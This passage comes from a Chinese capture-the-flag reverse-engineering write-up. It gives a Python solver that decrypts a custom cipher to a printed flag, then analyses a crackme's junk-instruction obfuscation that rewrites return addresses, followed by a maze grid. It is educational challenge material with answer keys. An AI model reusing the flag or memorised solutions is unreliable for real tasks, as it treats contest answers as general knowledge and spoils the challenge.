<span class="number">0x3D</span>, <span class="number">0x18</span>, <span class="number">0x1E</span>, <span class="number">0x61</span>,</span><br><span class="line">    <span class="number">0x1B</span>, <span class="number">0x2E</span>, <span class="number">0x6C</span>, <span class="number">0xDF</span>, <span class="number">0x2C</span>, <span class="number">0xAE</span>, <span class="number">0x65</span>, <span class="number">0x9D</span>, <span class="number">0xEB</span>, <span class="number">0x2F</span>,</span><br><span class="line">    <span class="number">0xDA</span>, <span class="number">0xF4</span>, <span class="number">0xDE</span>, <span class="number">0xCA</span>, <span class="number">0x56</span>, <span class="number">0x92</span>, <span class="number">0x75</span>, <span class="number">0x3B</span>, <span class="number">0x62</span>, <span class="number">0x45</span>,</span><br><span class="line">    <span class="number">0x06</span>, <span class="number">0x3C</span>, <span class="number">0x52</span>, <span class="number">0x33</span>, <span class="number">0x6E</span>, <span class="number">0x25</span>, <span class="number">0xCE</span>, <span class="number">0xA3</span>, <span class="number">0xD2</span>, <span class="number">0x44</span>,</span><br><span class="line">    <span class="number">0xA1</span>, <span class="number">0x4A</span>, <span class="number">0x58</span>, <span class="number">0xB1</span>, <span class="number">0xA0</span>, <span class="number">0x2A</span>, <span class="number">0x47</span>, <span class="number">0x0A</span>, <span class="number">0x02</span>, <span class="number">0xAF</span>,</span><br><span class="line">    <span class="number">0x50</span>, <span class="number">0xC3</span>, <span class="number">0xDC</span>, <span class="number">0xEA</span>, <span class="number">0xE5</span>, <span class="number">0x0D</span>, <span class="number">0x67</span>, <span class="number">0x91</span>, <span class="number">0xE1</span>, <span class="number">0x51</span>,</span><br><span class="line">    <span class="number">0xE3</span>, <span class="number">0xC1</span>, <span class="number">0xAA</span>, <span class="number">0x95</span>, <span class="number">0x5C</span>, <span class="number">0x79</span>, <span class="number">0x72</span>, <span class="number">0x1C</span>, <span class="number">0x3F</span>, <span class="number">0xB8</span>,</span><br><span class="line">    <span class="number">0xE8</span>, <span class="number">0x1F</span>, <span class="number">0xFF</span>, <span class="number">0x7A</span>, <span class="number">0x73</span>, <span class="number">0x26</span>, <span class="number">0x54</span>, <span class="number">0x9E</span>, <span class="number">0xED</span>, <span class="number">0xA9</span>,</span><br><span class="line">    <span class="number">0x41</span>, <span class="number">0x20</span>, <span class="number">0xEF</span>, <span class="number">0xA6</span>, <span class="number">0x48</span>, <span class="number">0x97</span>, <span class="number">0x4F</span>, <span class="number">0xD4</span>, <span class="number">0xBB</span>, <span class="number">0x23</span>,</span><br><span class="line">    <span class="number">0x66</span>, <span class="number">0xD9</span>, <span class="number">0xE4</span>, <span class="number">0x0B</span>, <span class="number">0x30</span>, <span class="number">0x15</span>, <span class="number">0xD7</span>, <span class="number">0x6B</span>, <span class="number">0x19</span>, <span class="number">0xCD</span>,</span><br><span class="line">    <span class="number">0xC4</span>, <span class="number">0x08</span>, <span class="number">0xB4</span>, <span class="number">0xC8</span>, <span class="number">0x14</span>, <span class="number">0xFD</span>, <span class="number">0x7F</span>, <span class="number">0x28</span>, <span class="number">0x0E</span>, <span class="number">0x05</span>,</span><br><span class="line">    <span class="number">0x0F</span>, <span class="number">0x4B</span>, <span class="number">0x6F</span>, <span class="number">0xF5</span>, <span class="number">0x90</span>, <span class="number">0x76</span>, <span class="number">0xBF</span>, <span class="number">0x60</span>, <span class="number">0xE7</span>, <span class="number">0x24</span>,</span><br><span class="line">    <span class="number">0x78</span>, <span class="number">0x6D</span>, <span class="number">0x71</span>, <span class="number">0xA8</span>, <span class="number">0x43</span>, <span class="number">0xB5</span>, <span class="number">0x0C</span>, <span class="number">0x31</span>, <span class="number">0xF9</span>, <span class="number">0xA2</span>,</span><br><span class="line">    <span class="number">0x9C</span>, <span class="number">0x99</span>, <span class="number">0xF6</span>, <span class="number">0x2D</span>, <span class="number">0xDB</span>, <span class="number">0xB7</span>, <span class="number">0xC9</span>, <span class="number">0x85</span>, <span class="number">0x81</span>, <span class="number">0x03</span>,</span><br><span class="line">    <span class="number">0x64</span>, <span class="number">0x1D</span>, <span class="number">0x07</span>, <span class="number">0x34</span>, <span class="number">0x5A</span>, <span class="number">0xBD</span>, <span class="number">0x37</span>, <span class="number">0x4C</span>, <span class="number">0xA7</span>, <span class="number">0x5F</span>,</span><br><span class="line">    <span class="number">0x46</span>, <span class="number">0xE9</span>, <span class="number">0x35</span>, <span class="number">0x93</span>, <span class="number">0x8D</span>, <span class="number">0xA5</span>, <span class="number">0xFB</span>, <span class="number">0x42</span>, <span class="number">0x01</span>, <span class="number">0xC2</span>,</span><br><span class="line">    <span class="number">0x17</span>, <span class="number">0x12</span>, <span class="number">0x1A</span>, <span class="number">0x77</span>, <span class="number">0xC6</span>, <span class="number">0x53</span>, <span class="number">0x83</span>, <span class="number">0x4D</span>, <span class="number">0xB2</span>, <span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0x2B</span>, <span class="number">0xF8</span>, <span class="number">0x88</span>, <span class="number">0x6A</span>, <span class="number">0x3E</span>, <span class="number">0xD0</span>, <span class="number">0x7C</span>, <span class="number">0x63</span>, <span class="number">0x40</span>, <span class="number">0x27</span>,</span><br><span class="line">    <span class="number">0xBE</span>, <span class="number">0xD5</span>, <span class="number">0x38</span>, <span class="number">0xD1</span>, <span class="number">0x74</span>, <span class="number">0xB6</span>, <span class="number">0x57</span>, <span class="number">0x94</span>, <span class="number">0xAB</span>, <span class="number">0x8A</span>,</span><br><span class="line">    <span class="number">0xB9</span>, <span class="number">0xBC</span>, <span class="number">0x7D</span>, <span class="number">0xB3</span>, <span class="number">0x96</span>, <span class="number">0x7E</span>, <span class="number">0xFC</span>, <span class="number">0xAD</span>, <span class="number">0x22</span>, <span class="number">0x4E</span>,</span><br><span class="line">    <span class="number">0xFA</span>, <span class="number">0xE0</span>, <span class="number">0xCB</span>, <span class="number">0x8B</span>, <span class="number">0xEE</span>, <span class="number">0x32</span>, <span class="number">0xA4</span>, <span class="number">0x16</span>, <span class="number">0xFE</span>, <span class="number">0x5B</span>,</span><br><span class="line">    <span class="number">0x13</span>, <span class="number">0xDD</span>, <span class="number">0xC0</span>, <span class="number">0x9A</span>, <span class="number">0x5E</span>, <span class="number">0x8E</span>, <span class="number">0x29</span>, <span class="number">0xF3</span>, <span class="number">0x8F</span>, <span class="number">0x49</span>,</span><br><span class="line">    <span class="number">0xE6</span>, <span class="number">0x9F</span>, <span class="number">0xF1</span>, <span class="number">0xC5</span>, <span class="number">0x70</span>, <span class="number">0x55</span>, <span class="number">0x8C</span>, <span class="number">0x11</span>, <span class="number">0xCC</span>, <span class="number">0x5D</span>,</span><br><span class="line">    <span class="number">0xEC</span>, <span class="number">0x00</span>, <span class="number">0xAC</span>, <span class="number">0x89</span>, <span class="number">0xD3</span>, <span class="number">0x82</span>, <span class="number">0x69</span>, <span class="number">0xD6</span>, <span class="number">0xBA</span>, <span class="number">0xD8</span>,</span><br><span class="line">    <span class="number">0x59</span>, <span class="number">0x98</span>, <span class="number">0x09</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, <span class="number">0xC7</span></span><br><span class="line">]</span><br><span class="line">box1 = [</span><br><span class="line">    <span class="number">0x13</span>, <span class="number">0x1F</span>, <span class="number">0x10</span>, <span class="number">0x1D</span>, <span class="number">0x01</span>, <span class="number">0x0D</span>, <span class="number">0x07</span>, <span class="number">0x15</span>, <span class="number">0x08</span>, <span class="number">0x06</span>,</span><br><span class="line">    <span class="number">0x16</span>, <span class="number">0x00</span>, <span class="number">0x0F</span>, <span class="number">0x0C</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x0E</span>, <span class="number">0x03</span>, <span class="number">0x12</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0x14</span>, <span class="number">0x1A</span>, <span class="number">0x1C</span>, <span class="number">0x1E</span>, <span class="number">0x19</span>, <span class="number">0x09</span>, <span class="number">0x1B</span>, <span class="number">0x11</span>, <span class="number">0x0B</span>,</span><br><span class="line">    <span class="number">0x17</span>, <span class="number">0x0A</span></span><br><span class="line">]</span><br><span class="line">box2 = [</span><br><span class="line">    <span class="number">0x7D</span>, <span class="number">0xB7</span>, <span class="number">0x24</span>, <span class="number">0x7E</span>, <span class="number">0xC3</span>, <span class="number">0x6B</span>, <span class="number">0xBD</span>, <span class="number">0xD8</span>, <span class="number">0x7F</span>, <span class="number">0x13</span>,</span><br><span class="line">    <span class="number">0x6E</span>, <span class="number">0x0F</span>, <span class="number">0x43</span>, <span class="number">0xCD</span>, <span class="number">0x6B</span>, <span class="number">0xCF</span>, <span class="number">0x18</span>, <span class="number">0x4F</span>, <span class="number">0x26</span>, <span class="number">0x18</span>,</span><br><span class="line">    <span class="number">0x12</span>, <span class="number">0x2A</span>, <span class="number">0x7E</span>, <span class="number">0x9B</span>, <span class="number">0x27</span>, <span class="number">0x4C</span>, <span class="number">0x33</span>, <span class="number">0x67</span>, <span class="number">0x40</span>, <span class="number">0xC9</span>,</span><br><span class="line">    <span class="number">0x9E</span>, <span class="number">0xC4</span></span><br><span class="line">]</span><br><span class="line">box3 = [</span><br><span class="line">    <span class="number">0x91</span>, <span class="number">0xDB</span>, <span class="number">0x9F</span>, <span class="number">0x5F</span>, <span class="number">0x26</span>, <span class="number">0x27</span>, <span class="number">0xD6</span>, <span class="number">0xA8</span>, <span class="number">0xBF</span>, <span class="number">0x41</span>,</span><br><span class="line">    <span class="number">0x16</span>, <span class="number">0x79</span>, <span class="number">0xDE</span>, <span class="number">0x73</span>, <span class="number">0x16</span>, <span class="number">0xF8</span>, <span class="number">0x1E</span>, <span class="number">0xBA</span>, <span class="number">0x6A</span>, <span class="number">0xBE</span>,</span><br><span class="line">    <span class="number">0xC6</span>, <span class="number">0x12</span>, <span class="number">0xB2</span>, <span class="number">0x39</span>, <span class="number">0x9E</span>, <span class="number">0xF3</span>, <span class="number">0x12</span>, <span class="number">0x4E</span>, <span class="number">0x02</span>, <span class="number">0x1C</span>,</span><br><span class="line">    <span class="number">0xE2</span>, <span class="number">0x43</span></span><br><span class="line">]</span><br><span class="line">map_table = [</span><br><span class="line">    <span class="number">29</span>, <span class="number">19</span>, <span class="number">16</span>, <span class="number">28</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">26</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">22</span>,</span><br><span class="line">    <span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">23</span>, <span class="number">18</span>, <span class="number">11</span>,</span><br><span class="line">    <span class="number">7</span>, <span class="number">6</span>, <span class="number">31</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">25</span>, <span class="number">10</span>, <span class="number">27</span>, <span class="number">30</span>, <span class="number">17</span>,</span><br><span class="line">    <span class="number">20</span>, <span class="number">4</span></span><br><span class="line">]</span><br><span class="line">cipher = [</span><br><span class="line">    <span class="number">0x65</span>, <span class="number">0x3E</span>, <span class="number">0x43</span>, <span class="number">0xB8</span>, <span class="number">0xBA</span>, <span class="number">0xDB</span>, <span class="number">0xF6</span>, <span class="number">0x88</span>, <span class="number">0x25</span>, <span class="number">0x1B</span>,</span><br><span class="line">    <span class="number">0x28</span>, <span class="number">0xC7</span>, <span class="number">0xC0</span>, <span class="number">0x54</span>, <span class="number">0xA6</span>, <span class="number">0x4A</span>, <span class="number">0x90</span>, <span class="number">0x37</span>, <span class="number">0xBC</span>, <span class="number">0x29</span>,</span><br><span class="line">    <span class="number">0x41</span>, <span class="number">0xAA</span>, <span class="number">0x28</span>, <span class="number">0xDB</span>, <span class="number">0x9A</span>, <span class="number">0x59</span>, <span class="number">0x63</span>, <span class="number">0x9E</span>, <span class="number">0x4B</span>, <span class="number">0xCF</span>,</span><br><span class="line">    <span class="number">0x2E</span>, <span class="number">0x41</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ROR</span>(<span class="params">a, n</span>):</span><br><span class="line">    <span class="keyword">return</span> ((a &gt;&gt; n) | (a &lt;&lt; (<span class="number">8</span> - n))) &amp; <span class="number">0xFF</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ROL</span>(<span class="params">a, n</span>):</span><br><span class="line">    <span class="keyword">return</span> ((a &lt;&lt; n) | (a &gt;&gt; (<span class="number">8</span> - n))) &amp; <span class="number">0xFF</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_func0</span>(<span class="params">input_data</span>):</span><br><span class="line">    result = input_data[:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> box[k] == input_data[i]:</span><br><span class="line">                result[i] = k</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_func1</span>(<span class="params">input_data</span>):</span><br><span class="line">    buffer = [<span class="number">0</span>] * <span class="number">32</span></span><br><span class="line">    result = [<span class="number">0</span>] * <span class="number">32</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        buffer[map_table[i]] = input_data[i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        result[i] = buffer[i]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_func2</span>(<span class="params">input_data</span>):</span><br><span class="line">    result = input_data[:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        result[i] = (result[i] - box3[i]) &amp; <span class="number">0xFF</span></span><br><span class="line">        result[i] ^= box2[i]</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_func3</span>(<span class="params">input_data</span>):</span><br><span class="line">    result = input_data[:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        result[i] = ROL(result[i], <span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">inv_func_table = [inv_func0, inv_func1, inv_func2, inv_func3]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">input_data, index</span>):</span><br><span class="line">    <span class="keyword">if</span> index &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> byte <span class="keyword">in</span> input_data:</span><br><span class="line">            <span class="keyword">if</span> byte &lt;= <span class="number">32</span> <span class="keyword">or</span> byte &gt;= <span class="number">127</span>:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> input_data))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    buffer = input_data[:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        current = buffer[:]</span><br><span class="line">        current = inv_func_table[i](current)</span><br><span class="line">        <span class="keyword">if</span> (current[index] &amp; <span class="number">3</span>) == i:</span><br><span class="line">            dfs(current, index - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    dfs(cipher, <span class="number">31</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;Ea5y_enCrypt_And_decrYpt!!&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="隐于花海"><a href="#隐于花海" class="headerlink" title="隐于花海"></a>隐于花海</h3><p>32位ida查看</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">; <span class="type">int</span> __cdecl main(<span class="type">int</span> argc, const <span class="type">char</span> <span class="operator">*</span><span class="operator">*</span>argv, const <span class="type">char</span> <span class="operator">*</span><span class="operator">*</span>envp)</span><br><span class="line">_main           proc near               ; CODE XREF: __scrt_common_main_seh(void)<span class="operator">+</span>F5↓p</span><br><span class="line"></span><br><span class="line">argc            <span class="operator">=</span> dword ptr  <span class="number">8</span></span><br><span class="line">argv            <span class="operator">=</span> dword ptr  <span class="number">0</span>Ch</span><br><span class="line">envp            <span class="operator">=</span> dword ptr  <span class="number">10</span>h</span><br><span class="line"></span><br><span class="line">; <span class="keyword">FUNCTION</span> CHUNK <span class="keyword">AT</span> .text:<span class="number">00402460</span> SIZE <span class="number">00000003</span> BYTES</span><br><span class="line"></span><br><span class="line">                push    ebp</span><br><span class="line">                mov     ebp, esp</span><br><span class="line">                push    <span class="keyword">offset</span> sub_401020</span><br><span class="line">                push    <span class="keyword">offset</span> sub_402850</span><br><span class="line">                push    <span class="keyword">offset</span> sub_4012F0</span><br><span class="line">                push    <span class="keyword">offset</span> sub_401330</span><br><span class="line">                push    <span class="keyword">offset</span> sub_402480</span><br><span class="line">                push    <span class="keyword">offset</span> loc_402810</span><br><span class="line">                push    <span class="keyword">offset</span> sub_401350</span><br><span class="line">                push    <span class="keyword">offset</span> sub_401360</span><br><span class="line">                push    <span class="keyword">offset</span> sub_401300</span><br><span class="line">                push    <span class="keyword">offset</span> sub_4012B0</span><br><span class="line">                push    <span class="keyword">offset</span> sub_402890</span><br><span class="line">                push    <span class="keyword">offset</span> loc_402FB0</span><br><span class="line">                push    <span class="keyword">offset</span> sub_402490</span><br><span class="line">                push    <span class="keyword">offset</span> sub_4012E0</span><br><span class="line">                push    <span class="keyword">offset</span> sub_402840</span><br><span class="line">                push    <span class="keyword">offset</span> sub_402450</span><br><span class="line">                push    <span class="keyword">offset</span> sub_402430</span><br><span class="line">                push    <span class="keyword">offset</span> sub_401340</span><br><span class="line">                push    <span class="keyword">offset</span> sub_401050</span><br><span class="line">                push    <span class="keyword">offset</span> sub_401040</span><br><span class="line">                push    <span class="keyword">offset</span> sub_4028C0</span><br><span class="line">                push    <span class="keyword">offset</span> sub_402440</span><br><span class="line">                push    <span class="keyword">offset</span> loc_401000</span><br><span class="line">                push    <span class="keyword">offset</span> sub_4012A0</span><br><span class="line">                push    <span class="keyword">offset</span> sub_4028A0</span><br><span class="line">                push    <span class="keyword">offset</span> sub_402420</span><br><span class="line">                push    <span class="keyword">offset</span> sub_402880</span><br><span class="line">                push    <span class="keyword">offset</span> sub_401320</span><br><span class="line">                push    <span class="keyword">offset</span> sub_401310</span><br><span class="line">                push    <span class="keyword">offset</span> sub_4012C0</span><br><span class="line">                push    <span class="keyword">offset</span> sub_401030</span><br><span class="line">                push    <span class="keyword">offset</span> sub_402860</span><br><span class="line">                push    <span class="keyword">offset</span> sub_402410</span><br><span class="line">                push    <span class="keyword">offset</span> sub_401010</span><br><span class="line">                push    <span class="keyword">offset</span> sub_402830</span><br><span class="line">                push    <span class="keyword">offset</span> sub_402820</span><br><span class="line">                push    <span class="keyword">offset</span> sub_402870</span><br><span class="line">                push    <span class="keyword">offset</span> sub_4012D0</span><br><span class="line">                push    <span class="keyword">offset</span> sub_4028B0</span><br><span class="line">                push    <span class="keyword">offset</span> loc_402460</span><br><span class="line">                retn</span><br><span class="line">_main           endp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                pop     ebp</span><br><span class="line">                retn</span><br></pre></td></tr></table></figure>

<p>进入main有花指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00402FB0 loc_402FB0:                             ; DATA XREF: _main+3A↓o</span><br><span class="line">.text:00402FB0                 cmp     eax, 4</span><br><span class="line">.text:00402FB3                 jz      short locret_402FBA</span><br><span class="line">.text:00402FB5                 call    loc_402A60</span><br><span class="line">.text:00402FBA</span><br><span class="line">.text:00402FBA locret_402FBA:                          ; CODE XREF: .text:00402FB3↑j</span><br><span class="line">.text:00402FBA                 retn</span><br><span class="line">.text:00402FBA ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00402FBB                 align 10h</span><br></pre></td></tr></table></figure>

<p>去看loc_402A60</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00402A7A                 mov     eax, 1</span><br><span class="line">.text:00402A7F                 imul    ecx, eax, 3</span><br><span class="line">.text:00402A82                 movsx   edx, byte_420100[ecx]</span><br><span class="line">.text:00402A89                 push    edx</span><br><span class="line">.text:00402A8A                 call    sub_4023E0</span><br></pre></td></tr></table></figure>

<p>从表 <code>byte_420100</code> 读取值，传入 <code>sub_4023E0</code>，ecx&#x3D;3，imul有符号整数乘法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.data:00420100 byte_420100     db 0                    ; DATA XREF: sub_401D80+63B↑o</span><br><span class="line">.data:00420100                                         ; sub_4024A0+4F↑r ...</span><br><span class="line">.data:00420101                 db    1</span><br><span class="line">.data:00420102                 db    2</span><br><span class="line">.data:00420103                 db    3</span><br><span class="line">.data:00420104                 db    4</span><br><span class="line">.data:00420105                 db    5</span><br><span class="line">.data:00420106                 db    6</span><br><span class="line">.data:00420107                 db    7</span><br></pre></td></tr></table></figure>

<p>byte_420100取值范围0~7</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:004023E0 sub_4023E0      proc near               ; CODE XREF: sub_4024A0+57↓p</span><br><span class="line">.text:004023E0                                         ; sub_4024A0+7A↓p ...</span><br><span class="line">.text:004023E0</span><br><span class="line">.text:004023E0 arg_0           = dword ptr  4</span><br><span class="line">.text:004023E0</span><br><span class="line">.text:004023E0                 mov     ebx, [esp+arg_0]</span><br><span class="line">.text:004023E4                 mov     eax, 0Ah</span><br><span class="line">.text:004023E9                 mov     ecx, ebx</span><br><span class="line">.text:004023EB                 not     eax</span><br><span class="line">.text:004023ED                 and     ebx, eax</span><br><span class="line">.text:004023EF                 not     eax</span><br><span class="line">.text:004023F1                 not     ecx</span><br><span class="line">.text:004023F3                 and     ecx, eax</span><br><span class="line">.text:004023F5                 or      ebx, ecx</span><br><span class="line">.text:004023F7                 inc     ebx</span><br><span class="line">.text:004023F8                 dec     ebx</span><br><span class="line">.text:004023F9                 mul     ebx</span><br><span class="line">.text:004023FB                 div     ebx</span><br><span class="line">.text:004023FD                 xor     ebx, eax</span><br><span class="line">.text:004023FF                 add     [esp+0], ebx</span><br><span class="line">.text:00402402                 retn    4</span><br><span class="line">.text:00402402 sub_4023E0      endp</span><br></pre></td></tr></table></figure>

<p>简化：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sub_4023E0:</span><br><span class="line">    mov     ebx, [esp+4]       ; ebx = arg</span><br><span class="line">    mov     eax, 0Ah           ; eax = 10</span><br><span class="line">    mov     ecx, ebx           ; ecx = arg</span><br><span class="line">    not     eax                ; eax = ~10</span><br><span class="line">    and     ebx, eax           ; ebx = arg &amp; ~10</span><br><span class="line">    not     eax                ; eax = 10</span><br><span class="line">    not     ecx                ; ecx = ~arg</span><br><span class="line">    and     ecx, eax           ; ecx = ~arg &amp; 10</span><br><span class="line">    or      ebx, ecx           ; ebx = (arg &amp; ~10) | (~arg &amp; 10)</span><br></pre></td></tr></table></figure>

<p><code>(arg &amp; ~mask) | (~arg &amp; mask)</code> 这个表达式是按位选择：当 <code>mask</code> 位为 1 时取原式&#x3D;<code>~arg</code> ，为 0 时原式&#x3D; <code>arg</code> 的那一位。代数上等价于 <code>arg ^ mask</code>（异或）。</p>
<p>本题mask&#x3D;0xA(10)，所以ebx&#x3D;arg^0xA。</p>
<p> inc指令用于将一个寄存器的值加1，dec指令用于将一个寄存器的值减1。</p>
<p>当前ebx&#x3D;arg^0xA，eax&#x3D;10</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mul     ebx                ; EDX:EAX = 10 * (arg^0xA)</span><br><span class="line">div     ebx                ;(10 * (arg^0xA))/(arg^0xA)</span><br><span class="line">xor     ebx, eax           ; ebx = EBX ^ 10</span><br><span class="line">add     [esp+0], ebx       ; *(DWORD*)(esp) += ebx   &lt;-- 修改返回地址</span><br><span class="line">ret     4</span><br></pre></td></tr></table></figure>

<p>div这里，如果(arg^0xA)!&#x3D;0，ebx &#x3D; (arg^0xA) ^ 10&#x3D;arg</p>
<p>到此这一长段乘除只是把 <code>ebx</code> 恢复为原始输入 <code>arg</code> ，是花指令</p>
<p>add这里，<code>esp+0</code> 是栈顶 <strong>返回地址</strong>（函数被调用时的 <code>ret</code> 地址）。因此它 <strong>把</strong> <strong><code>arg</code></strong> <strong>加到返回地址上</strong>（即修改返回地址，使得 <code>ret</code> 返回到 <code>return_address + arg</code>）。</p>
<p>[ ]取地址</p>
<table>
<thead>
<tr>
<th>平台 &#x2F; ABI</th>
<th>参数 1</th>
<th>参数 2</th>
<th>参数 3</th>
<th>参数 4</th>
<th>参数 5+</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>x86 (32位, cdecl&#x2F;stdcall)</td>
<td>[esp+4]</td>
<td>[esp+8]</td>
<td>[esp+0xC]</td>
<td>[esp+0x10]</td>
<td>继续往上递增</td>
<td>所有参数都压栈；[esp] 是返回地址</td>
</tr>
<tr>
<td>Windows x64 (MSVC ABI)</td>
<td>RCX</td>
<td>RDX</td>
<td>R8</td>
<td>R9</td>
<td>[rsp+0x28] 开始</td>
<td>栈上预留 32 字节 shadow space (rsp+20h 到 rsp+40h)，即使没用</td>
</tr>
<tr>
<td>System V AMD64 (Linux, macOS, BSD)</td>
<td>RDI</td>
<td>RSI</td>
<td>RDX</td>
<td>RCX</td>
<td>R8</td>
<td>R9</td>
</tr>
</tbody></table>
<p>sub_402A60，两次输入，第二次输入会被switch四个方向</p>
<p>迷宫终点是38，移动42次，累加和为117</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">64  49  49  49  49  49  48  48  48  48  49   0</span><br><span class="line">48  48  48  49  48  48  48  49  49  48  49   0</span><br><span class="line">49  49  48  49  48  49  48  48  49  48  49   0</span><br><span class="line">49  49  48  48  48  49  49  48  48  48  49   0</span><br><span class="line">49  49  48  49  49  48  48  48  49  49  49   0</span><br><span class="line">49  49  48  49  49  48  49  49  49  49  49   0</span><br><span class="line">49  48  48  48  48  48  49  49  49  49  49   0</span><br><span class="line">49  48  49  49  49  48  48  49  48  48  48   0</span><br><span class="line">49  48  48  48  49  49  48  48  48  49  48   0</span><br><span class="line">49  49  49  48  49  49  48  49  49  49  48   0</span><br><span class="line">49  49  49  48  48  48  48  48  48  48  38   0</span><br><span 